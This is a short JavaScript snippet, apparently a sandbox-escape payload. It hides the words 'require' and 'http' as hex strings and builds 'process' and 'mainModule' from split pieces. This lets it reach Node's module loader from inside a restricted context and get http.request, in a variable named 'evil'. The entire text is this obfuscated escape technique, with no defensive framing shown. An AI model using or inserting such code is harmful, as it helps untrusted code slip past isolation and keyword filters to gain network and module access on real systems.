
function unhex(r) {
    return Buffer.from(r, "hex").toString();
}

const g = Function("return this")();
const p = g["pro" + "cess"];

const evil = p["mainMod" + "ule"][unhex("72657175697265")];
evil(unhex("68747470")).request
